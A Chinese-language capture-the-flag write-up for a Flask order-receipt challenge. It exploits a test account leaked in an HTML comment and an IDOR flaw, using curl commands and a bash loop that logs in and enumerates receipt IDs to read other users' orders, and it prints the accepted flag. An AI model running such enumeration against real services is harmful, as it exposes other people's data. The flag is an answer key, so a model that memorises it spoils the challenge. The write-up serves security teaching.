## 题解

### 入口与指纹

`Apache/2.4.67 (Debian)`，应用是 Flask（404 页是 Werkzeug 样式），单端口。

首页 HTML 第一行就是线索——**注释里写着测试账号**：

```html
<!-- TODO: Delete the testing account (test:test). -->
```

登录表单 `POST /`，只有一个 `username` 字段（**第一步不要密码**）。

### 关键观察

**1. 登录是两步：先提交用户名，再单独提交密码。**

```bash
curl -i -X POST -d 'username=test' http://$T/
# 302 Location: /password/test
```

`GET /password/test` 返回第二步表单，里面带两个隐藏字段：

```html
<p>Welcome, John!</p>
<input name="username" value="test" hidden>
<input name="user_id"  value="10032" hidden>
<input name="password" type="password" required>
```

第二步：

```bash
curl -i -X POST -d 'username=test&user_id=10032&password=test' http://$T/password/test
# 302 Location: /dashboard?username=test
# Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0...; HttpOnly; Path=/
```

`session` 是 itsdangerous 签名的 Flask session，payload 只有 `{"user_id":10032}`。
把 `user_id` 改成 `1` 交给第二步，服务端仍按 `test` 认证并下发 `user_id=10032`——
**这个字段不可控**，不是绕过点。

**2. 订单列表把回执 ID 放在 `data-order-id` 里，回执是独立接口。**

`GET /orders` 列出 4 笔订单，每行有：

```html
<a href="#" class="receipt-link" data-order-id="300123">Receipt</a>
```

页面底部内联 JS 揭示了真正的接口：

```javascript
$.ajax({ url: '/order/' + orderId + '/receipt', method: 'GET', ... })
```

`GET /order/300123/receipt` 返回一段 HTML 片段，正文是订单详情加一句 Lorem ipsum。

**3. 回执接口不校验归属。**

拿任意数字 ID 请求，只要这个订单存在，就返回它的回执——不检查 `user_id` 是否属于当前会话。
订单 ID 是 6 位数、集中在 `300xxx` 段，扫描成本很低。

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)

# 1. 两步登录（账号来自首页注释 test:test）
curl -sS -c $cj -b $cj -X POST -d 'username=test' "http://$T/"
curl -sS -c $cj -b $cj -X POST \
  -d 'username=test&user_id=10032&password=test' "http://$T/password/test"

# 2. 枚举回执 ID，找带 flag 的那一张
for id in $(seq 300000 301000); do
  body=$(curl -sS -b $cj "http://$T/order/$id/receipt")
  case "$body" in *flag{*) echo "$id $body"; break;; esac
done
```

命中 `300998`，回执正文里有 flag。本次平台接受的值是
`flag{e0e0f7fd-1f5d-4bb7-b4cb-006d2e949786}`。

用 30 并发扫 1000 个 ID 约十几秒；实际它在第一段区间内（300998）。

### flag 位置

`GET /order/300998/receipt` 的 HTML 片段正文。这张回执不属于 `test`（`user_id=10032`），
只有靠越权才能读到。

## 复盘

- **两步登录是"用户名枚举"和"口令校验"分离的常见形态。** 第一步只提交用户名就能拿到
  `Welcome, <名字>!` 和隐藏的 `user_id`，等于免费拿到了用户 ID 空间。
- **隐藏字段要逐个试能不能改。** 本题 `user_id` 改了无效（服务端以 URL/会话为准），
  但同类题里它经常就是越权入口——试的成本是 1 个请求，值得。
- **内联 JS 比目录扫描快。** `/order/{id}/receipt` 这个接口在 HTML 里就写着，
  而盲猜 `/receipt/300123`、`/orders/300123`、`/receipts/300123` 全是 404。
- **IDOR 的判据是"别人的 ID 也能读到"。** 本题自己的 4 张回执都是 Lorem ipsum，
  所以要扫的是**不在列表里**的 ID（`300998` 就不在 `/orders` 的 4 个 ID 之中）。
